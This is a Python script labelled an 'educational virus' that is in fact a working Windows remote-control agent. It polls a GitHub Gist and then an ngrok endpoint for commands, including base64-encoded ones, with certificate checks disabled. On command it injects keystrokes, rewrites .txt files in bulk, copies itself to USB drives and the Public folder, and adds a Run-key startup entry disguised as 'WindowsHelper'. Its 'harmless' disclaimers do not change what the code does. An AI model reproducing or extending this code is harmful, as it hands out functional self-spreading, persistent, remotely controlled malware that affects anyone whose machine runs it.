#!/usr/bin/env python3
"""
EDUCATIONAL VIRUS — for classroom demonstration only
Professor's assignment: demonstrate malware concepts harmlessly

== FEATURES (all harmless & reversible) ==
  [C2]  Polls a GitHub Gist URL for commands
  [1]  Popup message boxes (MessageBoxW)
  [2]  Simulate keystroke typing (SendKeys-style)
  [3]  Spam Notepad windows with custom text
  [4]  Change desktop wallpaper (saves & restores original)
  [5]  Mouse jiggler
  [6]  Open/close CD/DVD tray
  [7]  Self-replicate to folders / USB drives
  [8]  Reverse .txt file contents (reversible w/ .bak)
  [9]  Screen flash (colored overlays via PowerShell)
  [10] Stealth cursor movement
  [11] Startup persistence (RUN registry key)
  [12] Ping — show agent info
  [13] Kill switch — full cleanup + self-destruct

Usage:
  Set GIST_URL below to your command Gist URL, or leave default.
  The agent polls every N seconds for new commands.

=== WARNING ===
Only run on systems you own or have explicit permission to test on.
This is for EDUCATIONAL PURPOSES only.
"""

import os
import sys
import time
import json
import uuid
import urllib.request
import urllib.error
import ssl
import base64
import hashlib
import shutil
import ctypes
import ctypes.wintypes
import subprocess
import random
import tempfile
import threading
import winreg

# ===================== CONFIGURATION =====================

# Gist URL with cachebuster — raw URL has no rate limits
GIST_URL = "https://gist.githubusercontent.com/vLoon-jpg/99a46fc04b180fffdafc03584c0d5a2e/raw/c2_command.txt"

# Poll interval — fast enough for demos
POLL_INTERVAL = 10

# Agent ID — unique per installation
_host = os.environ.get("COMPUTERNAME", "UNKNOWN")
AGENT_ID = hashlib.md5(_host.encode() + uuid.uuid4().bytes).hexdigest()[:8]

# Registry key for persistence
REG_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_NAME = "WindowsHelper"

# Backup directory for original wallpaper / reversed files
BACKUP_DIR = os.path.join(tempfile.gettempdir(), "EDU_VAULT")

# Wallpaper backup path
WALLPAPER_BACKUP_FILE = os.path.join(BACKUP_DIR, "original_wallpaper_path.txt")

# SSL context (avoids cert issues on some Windows Python installs)
_SSL_CTX = ssl._create_unverified_context()


# ===================== HELPERS =====================

def msgbox(text, title="EDU-Virus", style=0):
    """Show a Windows message box. style=0=OK, 1=OKCancel, etc."""
    ctypes.windll.user32.MessageBoxW(0, text, title, style)


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


def save_original_wallpaper():
    """Save current wallpaper path to backup file (before changing it)."""
    os.makedirs(BACKUP_DIR, exist_ok=True)
    buf = ctypes.create_unicode_buffer(520)
    ctypes.windll.user32.SystemParametersInfoW(0x0073, 520, buf, 0)
    current = buf.value
    if current:
        with open(WALLPAPER_BACKUP_FILE, "w") as f:
            f.write(current)
        return current
    return None


def fetch_url(url, timeout=15):
    """Fetch a URL with SSL workaround + cachebuster for CDN staleness."""
    # Add cachebuster to defeat CDN cache on raw Gist URLs
    sep = "&" if "?" in url else "?"
    url = f"{url}{sep}t={int(time.time())}"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=timeout, context=_SSL_CTX) as resp:
            return resp.read().decode("utf-8", errors="replace").strip()
    except Exception:
        return ""


def fetch_paste(url):
    """Fetch the raw Gist content."""
    return fetch_url(url)


def parse_commands(raw_text):
    """
    Parse paste text into list of commands.
    Accepts: JSON object, JSON array, or pipe-delimited lines.
    """
    if not raw_text:
        return []

    # Try JSON
    try:
        data = json.loads(raw_text)
        if isinstance(data, list):
            return data
        if isinstance(data, dict):
            # Single command object
            if "cmd" in data or "command" in data:
                return [data]
            # Wrapped in {"commands": [...]}
            if "commands" in data:
                return data["commands"]
    except json.JSONDecodeError:
        pass

    # Plain text — line by line
    commands = []
    for line in raw_text.strip().split("\n"):
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("//"):
            continue
        if line.startswith("b64:"):
            try:
                line = base64.b64decode(line[4:]).decode().strip()
            except Exception:
                continue
        commands.append(line)

    return commands


def should_execute(cmd_id, seen_file):
    if not os.path.exists(seen_file):
        return True
    with open(seen_file, "r") as f:
        seen = set(line.strip() for line in f if line.strip())
    return cmd_id not in seen


def mark_executed(cmd_id, seen_file):
    os.makedirs(os.path.dirname(seen_file), exist_ok=True)
    with open(seen_file, "a") as f:
        f.write(cmd_id + "\n")


def get_drives():
    """Get all drive letters (for USB replication)."""
    drives = []
    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
    for i, letter in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
        if bitmask & (1 << i):
            drives.append(f"{letter}:\\")
    return [d for d in drives if os.path.exists(d)]


def send_key(char):
    """
    Send a single keystroke via keybd_event, handling Shift for uppercase
    and special characters properly using virtual-key codes.
    """
    VK_MAP = {
        'a': 0x41, 'b': 0x42, 'c': 0x43, 'd': 0x44, 'e': 0x45,
        'f': 0x46, 'g': 0x47, 'h': 0x48, 'i': 0x49, 'j': 0x4A,
        'k': 0x4B, 'l': 0x4C, 'm': 0x4D, 'n': 0x4E, 'o': 0x4F,
        'p': 0x50, 'q': 0x51, 'r': 0x52, 's': 0x53, 't': 0x54,
        'u': 0x55, 'v': 0x56, 'w': 0x57, 'x': 0x58, 'y': 0x59,
        'z': 0x5A,
        '0': 0x30, '1': 0x31, '2': 0x32, '3': 0x33, '4': 0x34,
        '5': 0x35, '6': 0x36, '7': 0x37, '8': 0x38, '9': 0x39,
        ' ': 0x20, '\n': 0x0D, '.': 0xBE, ',': 0xBC, ';': 0xBA,
        '\'': 0xDE, '-': 0xBD, '=': 0xBB, '/': 0xBF, '\\': 0xDC,
        '[': 0xDB, ']': 0xDD, '`': 0xC0, '\t': 0x09,
    }
    SHIFT_CHARS = set('ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"<>?~')

    lower = char.lower()
    if lower in VK_MAP:
        vk = VK_MAP[lower]
        needs_shift = char in SHIFT_CHARS

        if needs_shift:
            ctypes.windll.user32.keybd_event(0x10, 0, 0, 0)  # VK_SHIFT down
            time.sleep(0.01)

        ctypes.windll.user32.keybd_event(vk, 0, 0, 0)
        time.sleep(0.01)
        ctypes.windll.user32.keybd_event(vk, 0, 2, 0)

        if needs_shift:
            time.sleep(0.01)
            ctypes.windll.user32.keybd_event(0x10, 0, 2, 0)  # VK_SHIFT up
    else:
        # Try clipboard fallback for exotic chars
        try:
            import ctypes.wintypes
            CF_UNICODETEXT = 13
            GMEM_MOVEABLE = 0x0002

            # Open clipboard, set text
            ctypes.windll.user32.OpenClipboard(0)
            ctypes.windll.user32.EmptyClipboard()
            h_mem = ctypes.windll.kernel32.GlobalAlloc(GMEM_MOVEABLE, (len(char) + 1) * 2)
            p_mem = ctypes.windll.kernel32.GlobalLock(h_mem)
            ctypes.windll.kernel32.RtlMoveMemory(p_mem, char.encode('utf-16le'), len(char) * 2 + 2)
            ctypes.windll.kernel32.GlobalUnlock(h_mem)
            ctypes.windll.user32.SetClipboardData(CF_UNICODETEXT, h_mem)
            ctypes.windll.user32.CloseClipboard()

            # Paste
            ctypes.windll.user32.keybd_event(0x11, 0, 0, 0)  # Ctrl down
            ctypes.windll.user32.keybd_event(0x56, 0, 0, 0)  # V down
            ctypes.windll.user32.keybd_event(0x56, 0, 2, 0)  # V up
            ctypes.windll.user32.keybd_event(0x11, 0, 2, 0)  # Ctrl up
        except Exception:
            pass  # Skip unsendable chars


# ==================== COMMAND HANDLERS ====================

def cmd_popup(args):
    """[1] Show a message box with custom text."""
    title = args[0] if len(args) > 0 else "System Notification"
    text = args[1] if len(args) > 1 else "Hello from Educational Virus!"
    threading.Thread(target=msgbox, args=(text, title), daemon=True).start()
    return f"Popup shown: {title} — {text}"


def cmd_typer(args):
    """[2] Simulate typing text keystroke by keystroke."""
    text = " ".join(args) if args else "Hello from Educational Virus!"
    for char in text:
        send_key(char)
        time.sleep(0.03 + random.uniform(0, 0.05))
    return f"Typed: {text[:50]}{'...' if len(text) > 50 else ''}"


def cmd_notepad(args):
    """[3] Open Notepad and type a message. Format: notepad|count|text"""
    if args and args[0].isdigit():
        n = int(args[0])
        text = " ".join(args[1:]) if len(args) > 1 else "Hello from Educational Virus!"
    else:
        n = 1
        text = " ".join(args) if args else "Hello from Educational Virus!"

    def _notepad_worker(count, msg):
        for _ in range(count):
            try:
                subprocess.Popen(["notepad.exe"])
                time.sleep(0.8)
                for char in msg:
                    send_key(char)
                    time.sleep(0.02 + random.uniform(0, 0.03))
                send_key('\n')
                time.sleep(random.uniform(1.5, 3))
            except Exception:
                pass

    threading.Thread(target=_notepad_worker, args=(n, text), daemon=True).start()
    return f"Opened {n} Notepad window(s) with: {text[:30]}..."


def cmd_wallpaper(args):
    """[4] Change desktop wallpaper (saves original first)."""
    image_url = args[0] if args else "https://upload.wikimedia.org/wikipedia/en/thumb/9/9a/Trollface_non-free.png/220px-Trollface_non-free.png"

    # Save original wallpaper BEFORE changing
    save_original_wallpaper()

    # Download new wallpaper
    os.makedirs(BACKUP_DIR, exist_ok=True)
    img_path = os.path.join(BACKUP_DIR, "wallpaper_temp.bmp")
    try:
        fetch_result = fetch_url(image_url)
        if not fetch_result:
            # Try urlretrieve directly
            urllib.request.urlretrieve(image_url, img_path, context=_SSL_CTX)
        else:
            # It's a text response, not an image — write it
            with open(img_path, "wb") as f:
                f.write(fetch_result.encode())
    except Exception as e:
        return f"Failed to download wallpaper: {e}"

    # SPI_SETDESKWALLPAPER with SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
    ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, img_path, 0x0002)
    return f"Wallpaper changed (original saved)"


def cmd_restore_wallpaper(args):
    """Restore original wallpaper."""
    if os.path.exists(WALLPAPER_BACKUP_FILE):
        with open(WALLPAPER_BACKUP_FILE) as f:
            orig = f.read().strip()
        if orig and os.path.exists(orig):
            ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, orig, 0x0002)
            return "Wallpaper restored to original"

    # Fallback: reset to solid color
    ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, "", 0x0002)
    return "Wallpaper reset to default (original not found)"


def cmd_mouse(args):
    """[5] Jiggle the mouse for N seconds."""
    seconds = int(args[0]) if args and args[0].isdigit() else 10
    screen_w = ctypes.windll.user32.GetSystemMetrics(0)
    screen_h = ctypes.windll.user32.GetSystemMetrics(1)
    end_time = time.time() + seconds

    while time.time() < end_time:
        x = random.randint(0, max(screen_w - 1, 1))
        y = random.randint(0, max(screen_h - 1, 1))
        ctypes.windll.user32.SetCursorPos(x, y)
        time.sleep(random.uniform(0.1, 0.5))

    return f"Mouse jiggled for {seconds}s"


def cmd_tray(args):
    """[6] Open/close CD/DVD tray."""
    action = args[0].lower() if args else "open"
    door_cmd = "open" if action == "open" else "closed"
    try:
        ctypes.windll.winmm.mciSendStringW(f"set CDAudio door {door_cmd}", None, 0, 0)
        return f"CD tray: {action}"
    except Exception:
        return "CD tray command failed (no optical drive?)"


def cmd_replicate(args):
    """[7] Copy virus to target path(s) or all removable drives."""
    target = args[0] if args else None
    script_path = os.path.abspath(sys.argv[0])
    copies_made = []

    if target and os.path.isdir(target):
        dest = os.path.join(target, "edu_virus.py")
        try:
            shutil.copy2(script_path, dest)
            copies_made.append(dest)
        except Exception:
            pass
    else:
        # Replicate to non-C: drives (USB)
        for drive in get_drives():
            if drive[0].upper() == "C":
                continue
            dest = os.path.join(drive, "edu_virus.py")
            try:
                shutil.copy2(script_path, dest)
                copies_made.append(dest)
            except Exception:
                pass

        # Also replicate to Public folder
        pub_dest = os.path.join("C:\\Users\\Public", "edu_virus.py")
        try:
            shutil.copy2(script_path, pub_dest)
            copies_made.append(pub_dest)
        except Exception:
            pass

    if copies_made:
        paths = "; ".join(copies_made[:3])
        return f"Replicated to {len(copies_made)} location(s): {paths}"
    return "Replication: no writable targets found"


def cmd_reversetxt(args):
    """[8] Reverse contents of .txt files in a folder (creates .bak originals)."""
    path = args[0] if args else "."
    if not os.path.isdir(path):
        return f"Path not found: {path}"

    os.makedirs(BACKUP_DIR, exist_ok=True)
    reversed_count = 0

    for root, _, files in os.walk(path):
        for fname in files:
            if not fname.endswith(".txt"):
                continue
            fpath = os.path.join(root, fname)

            # Backup original (only once)
            bak_name = fname + ".bak"
            bak_path = os.path.join(BACKUP_DIR, bak_name)
            if not os.path.exists(bak_path):
                try:
                    shutil.copy2(fpath, bak_path)
                except Exception:
                    continue

            # Read and reverse
            try:
                with open(fpath, "r", encoding="utf-8", errors="replace") as f:
                    content = f.read()
                with open(fpath, "w", encoding="utf-8", errors="replace") as f:
                    f.write(content[::-1])
                reversed_count += 1
            except Exception:
                pass

    return f"Reversed {reversed_count} text file(s)"


def cmd_screen_flash(args):
    """[9] Flash full-screen colored windows briefly via PowerShell."""
    color_map = {
        "red": (255, 0, 0),
        "green": (0, 255, 0),
        "blue": (0, 0, 255),
        "yellow": (255, 255, 0),
        "cyan": (0, 255, 255),
        "magenta": (255, 0, 255),
        "white": (255, 255, 255),
    }
    color_name = args[0].lower() if args else "random"
    flashes = min(int(args[1]) if len(args) > 1 and args[1].isdigit() else 3, 10)

    colors = list(color_map.values())
    if color_name in color_map:
        colors = [color_map[color_name]]

    ps_template = (
        'Add-Type -AssemblyName System.Windows.Forms; '
        '$f=New-Object Windows.Forms.Form; '
        '$f.WindowState="Maximized"; '
        '$f.FormBorderStyle="None"; '
        '$f.TopMost=$true; '
        '$f.BackColor="{color}"; '
        '$f.Show(); '
        'Start-Sleep -Milliseconds 250; '
        '$f.Close()'
    )

    for _ in range(flashes):
        r, g, b = random.choice(colors)
        hex_color = f"#{r:X2}{g:X2}{b:X2}"
        ps = ps_template.replace("{color}", hex_color)
        try:
            subprocess.Popen(
                ["powershell", "-WindowStyle", "Hidden", "-Command", ps],
                shell=False,
            )
        except Exception:
            pass
        time.sleep(0.6)

    return f"Screen flashed {flashes} time(s)"


def cmd_cursor(args):
    """[10] Move cursor in a pattern (spiral/random/square)."""
    pattern = args[0].lower() if args else "random"
    screen_w = ctypes.windll.user32.GetSystemMetrics(0)
    screen_h = ctypes.windll.user32.GetSystemMetrics(1)
    cx, cy = screen_w // 2, screen_h // 2

    if pattern == "spiral":
        for t in range(0, 360, 5):
            rad = t * 3.14159 / 180
            radius = t * 0.8  # Grows slowly
            x = int(cx + radius * (t / 180) * (t / 180))
            y = int(cy + radius * (t / 180) * (t / 180))
            # Clamp to screen
            x = max(0, min(x, screen_w - 1))
            y = max(0, min(y, screen_h - 1))
            ctypes.windll.user32.SetCursorPos(x, y)
            time.sleep(0.02)
    elif pattern == "square":
        max_step = min(screen_w, screen_h) // 4
        for step in range(0, max_step, 10):
            for dx, dy in [(step, 0), (step, step), (0, step), (0, 0)]:
                ctypes.windll.user32.SetCursorPos(cx + dx, cy + dy)
                time.sleep(0.01)
    else:
        # Random
        for _ in range(50):
            x = random.randint(50, max(50, screen_w - 50))
            y = random.randint(50, max(50, screen_h - 50))
            ctypes.windll.user32.SetCursorPos(x, y)
            time.sleep(0.08)

    return f"Cursor pattern: {pattern}"


def cmd_persist(args):
    """[11] Add to Windows startup via HKCU RUN registry key."""
    script_path = os.path.abspath(sys.argv[0])
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, REG_KEY, 0,
            winreg.KEY_SET_VALUE
        ) as key:
            value = f'"{sys.executable}" "{script_path}"'
            winreg.SetValueEx(key, REG_NAME, 0, winreg.REG_SZ, value)
        return "Added to startup (HKCU Run)"
    except Exception as e:
        return f"Failed to add to startup: {e}"


def cmd_unpersist(args):
    """Remove from startup."""
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, REG_KEY, 0,
            winreg.KEY_SET_VALUE
        ) as key:
            try:
                winreg.DeleteValue(key, REG_NAME)
                return "Removed from startup"
            except FileNotFoundError:
                return "Not in startup (nothing to remove)"
    except Exception as e:
        return f"Failed to remove from startup: {e}"


def cmd_ping(args):
    """[12] Show agent info in a message box."""
    info = (
        f"=== Agent Ping ===\n"
        f"  Agent ID:  {AGENT_ID}\n"
        f"  Hostname:  {os.environ.get('COMPUTERNAME', 'UNKNOWN')}\n"
        f"  Python:    {sys.version.split()[0]}\n"
        f"  Time:      {time.ctime()}\n"
        f"  Admin:     {'Yes' if is_admin() else 'No'}\n"
        f"  Poll Int:  {POLL_INTERVAL}s\n"
        f"  Backup:    {BACKUP_DIR}\n"
        f"  Drives:    {', '.join(get_drives())}"
    )
    msgbox(info, "EDU-Virus Ping")
    return "Ping sent"


def cmd_selfdestruct(args):
    """
    [13] Kill switch — remove all traces and delete self.
    WARNING: This actually deletes the script file.
    """
    msgbox(
        "Virus self-destruct initiated. All artifacts will be removed.",
        "SELF-DESTRUCT",
        1,
    )

    # Remove from startup
    cmd_unpersist(args)

    # Remove backup directory
    if os.path.exists(BACKUP_DIR):
        try:
            shutil.rmtree(BACKUP_DIR)
        except Exception:
            pass

    # Remove replicated copies
    for drive in get_drives():
        if drive[0].upper() == "C":
            continue
        for fname in ["edu_virus.py"]:
            fpath = os.path.join(drive, fname)
            if os.path.exists(fpath):
                try:
                    os.remove(fpath)
                except Exception:
                    pass

    pub_path = os.path.join("C:\\Users\\Public", "edu_virus.py")
    if os.path.exists(pub_path):
        try:
            os.remove(pub_path)
        except Exception:
            pass

    # Delete self — start a detached process that loops deleting until gone
    script = os.path.abspath(sys.argv[0])
    try:
        bat_path = os.path.join(tempfile.gettempdir(), "edu_cleanup.bat")
        with open(bat_path, "w") as f:
            f.write("@echo off\r\n")
            f.write(f":loop\r\n")
            f.write(f'del /f /q "{script}" >nul 2>&1\r\n')
            f.write(f'if exist "{script}" goto loop\r\n')
            f.write(f'del /f /q "%~f0" >nul 2>&1\r\n')
        subprocess.Popen(["cmd", "/c", bat_path], shell=True)
        return "Self-destruct initiated. Goodbye!"
    except Exception as e:
        return f"Self-destruct failed: {e}"


def cmd_help(args):
    """Show all available commands."""
    handler_map = {k: v for k, v in HANDLERS.items() if k != "self_destruct"}
    lines = ["=== EDUCATIONAL VIRUS — Commands ===\n"]
    for cmd, func in sorted(handler_map.items()):
        doc = func.__doc__ or ""
        # Extract [N] description
        if "[" in doc and "]" in doc:
            short = doc.split("]", 1)[1].strip()
            lines.append(f"  {cmd:<16}{short}")
    lines.append(f"\nAgent ID: {AGENT_ID}")
    msgbox("\n".join(lines), "EduVirus Help")
    return "Help displayed"


# ===================== COMMAND DISPATCH =====================

HANDLERS = {
    "popup": cmd_popup,
    "msgbox": cmd_popup,
    "notepad": cmd_notepad,
    "typer": cmd_typer,
    "type": cmd_typer,
    "wallpaper": cmd_wallpaper,
    "wall": cmd_wallpaper,
    "restore_wallpaper": cmd_restore_wallpaper,
    "restore": cmd_restore_wallpaper,
    "mouse": cmd_mouse,
    "jiggle": cmd_mouse,
    "tray": cmd_tray,
    "cd": cmd_tray,
    "replicate": cmd_replicate,
    "copy": cmd_replicate,
    "reversetxt": cmd_reversetxt,
    "reverse": cmd_reversetxt,
    "flash": cmd_screen_flash,
    "screen": cmd_screen_flash,
    "cursor": cmd_cursor,
    "persist": cmd_persist,
    "startup": cmd_persist,
    "unpersist": cmd_unpersist,
    "ping": cmd_ping,
    "selfdestruct": cmd_selfdestruct,
    "self_destruct": cmd_selfdestruct,
    "kill": cmd_selfdestruct,
    "help": cmd_help,
    "commands": cmd_help,
}

# Deduplicate command IDs
_executed_ids_file = None
_executed_ids = set()


def _init_executed_ids():
    global _executed_ids_file, _executed_ids
    os.makedirs(BACKUP_DIR, exist_ok=True)
    _executed_ids_file = os.path.join(BACKUP_DIR, "executed_commands.txt")
    if os.path.exists(_executed_ids_file):
        with open(_executed_ids_file) as f:
            _executed_ids = set(line.strip() for line in f if line.strip())
    else:
        _executed_ids = set()


def _is_new_command(cmd_id):
    return cmd_id not in _executed_ids


def _mark_done(cmd_id):
    global _executed_ids
    _executed_ids.add(cmd_id)
    with open(_executed_ids_file, "a") as f:
        f.write(cmd_id + "\n")


def execute_command(cmd, seen_file):
    """Parse and execute a single command. Returns result string or None."""
    # JSON object
    if isinstance(cmd, dict):
        command = cmd.get("cmd", "").strip().lower()
        args = cmd.get("args", [])
        cmd_id = cmd.get("id") or hashlib.md5(json.dumps(cmd, sort_keys=True).encode()).hexdigest()[:16]
    else:
        cmd_str = cmd.strip()
        cmd_id = hashlib.md5(cmd_str.encode()).hexdigest()[:16]

        # Targeting: "target:AGENT_ID|cmd|args"
        if cmd_str.startswith("target:"):
            parts = cmd_str.split("|", 2)
            target_id = parts[0].split(":", 1)[1].strip()
            if target_id != AGENT_ID:
                return None  # Not for us
            cmd_str = parts[2] if len(parts) > 2 else (parts[1] if len(parts) > 1 else "")
            cmd_id = hashlib.md5(cmd_str.encode()).hexdigest()[:16]

        # Dedup check (after targeting resolves)
        if not _is_new_command(cmd_id):
            return None

        # Parse "cmd|arg1|arg2"
        pipe_parts = cmd_str.split("|", 1)
        command = pipe_parts[0].strip().lower()
        args = pipe_parts[1].split("|") if len(pipe_parts) > 1 else []

    # Validate
    if not command:
        return None
    if command not in HANDLERS:
        return f"Unknown command: {command}"

    # Mark as executed (prevents re-run on next poll)
    _mark_done(cmd_id)

    # Execute
    try:
        result = HANDLERS[command](args)
        return f"[✓] {command}: {result}"
    except Exception as e:
        return f"[✗] {command}: Error: {e}"


# ===================== C2 LOOP =====================

# In-memory ngrok URL (set via Gist command)
_current_ngrok_url = None


def c2_loop():
    """Main C2 loop — Gist for commands + ngrok URL, primary via ngrok."""
    seen_file = os.path.join(BACKUP_DIR, "executed_commands.txt")
    os.makedirs(BACKUP_DIR, exist_ok=True)

    global _current_ngrok_url
    consecutive_fails = 0
    last_poll_was_ngrok = False
    ngrok_poll = 5          # Fast polling when ngrok is alive
    fallback_poll = 10      # Normal polling on Gist
    fail_limit = 3

    while True:
        try:
            if _current_ngrok_url and last_poll_was_ngrok:
                # Primary: poll ngrok at 5s
                url = _current_ngrok_url.rstrip("/") + "/cmd/latest"
                raw = fetch_url(url, timeout=5)
                poll_interval = ngrok_poll

                if raw:
                    try:
                        data = json.loads(raw)
                        cmd_id = data.get("id")
                        if cmd_id and _is_new_command(cmd_id) and data.get("cmd"):
                            _mark_done(cmd_id)
                            command = data["cmd"].strip().lower()
                            args = data.get("args", [])
                            if command in HANDLERS:
                                result = HANDLERS[command](args)
                                print(f"[{time.strftime('%H:%M:%S')}] [ngrok] ✓ {command}: {result}")
                            else:
                                print(f"[{time.strftime('%H:%M:%S')}] [ngrok] Unknown: {command}")
                        consecutive_fails = 0
                    except (json.JSONDecodeError, Exception):
                        consecutive_fails += 1
                else:
                    consecutive_fails += 1

                # Switch back to Gist if ngrok keeps failing
                if consecutive_fails >= fail_limit:
                    print(f"[{time.strftime('%H:%M:%S')}] ngrok unreachable, falling back to Gist")
                    _current_ngrok_url = None
                    last_poll_was_ngrok = False
                    consecutive_fails = 0

            else:
                # Fallback: poll Gist at 10s — gets commands + ngrok_url
                raw = fetch_paste(GIST_URL)
                poll_interval = fallback_poll

                if raw:
                    # Check if it's a "set_ngrok" meta-command
                    try:
                        data = json.loads(raw)
                        if isinstance(data, dict) and data.get("cmd") == "set_ngrok":
                            args = data.get("args", [])
                            if args:
                                _current_ngrok_url = args[0]
                                cmd_id = data.get("id", str(int(time.time())))
                                _mark_done(cmd_id)
                                print(f"[{time.strftime('%H:%M:%S')}] [gist] ngrok URL set: {_current_ngrok_url}")
                                last_poll_was_ngrok = True
                                continue  # Skip to next loop at faster interval
                    except (json.JSONDecodeError, Exception):
                        pass

                    commands = parse_commands(raw)
                    if commands:
                        for cmd in commands:
                            result = execute_command(cmd, seen_file)
                            if result:
                                print(f"[{time.strftime('%H:%M:%S')}] [gist] {result}")
                        consecutive_fails = 0

                        # Check if we should try ngrok
                        if _current_ngrok_url:
                            try:
                                test = fetch_url(_current_ngrok_url.rstrip("/") + "/cmd/config", timeout=3)
                                if test:
                                    print(f"[{time.strftime('%H:%M:%S')}] ngrok back! Switching to primary.")
                                    last_poll_was_ngrok = True
                                    continue
                            except:
                                pass
                    else:
                        if consecutive_fails == 0:
                            pass  # Silent when idle
                else:
                    consecutive_fails += 1
                    if consecutive_fails <= 2:
                        print(f"[{time.strftime('%H:%M:%S')}] [gist] Fetch failed")

        except Exception as e:
            consecutive_fails += 1
            if consecutive_fails <= 2:
                print(f"[{time.strftime('%H:%M:%S')}] C2 error: {e}")

        time.sleep(poll_interval)


# ===================== MAIN =====================

if __name__ == "__main__":
    _init_executed_ids()

    print()
    print("  EDUCATIONAL VIRUS v2.0")
    print("  For Classroom Use Only")
    print()
    print(f"  Agent ID: {AGENT_ID}")
    print(f"  Hostname: {os.environ.get('COMPUTERNAME', 'UNKNOWN')}")
    print(f"  Admin:    {'Yes' if is_admin() else 'No'}")
    print(f"  C2 URL:   {GIST_URL}")
    print(f"  Poll:     every {POLL_INTERVAL}s")
    print(f"  Backup:   {BACKUP_DIR}")
    print()

    msgbox(
        f"Virus active :)",
        "EDU-Virus"
    )

    try:
        c2_loop()
    except KeyboardInterrupt:
        print("\nShutdown by user.")
        sys.exit(0)
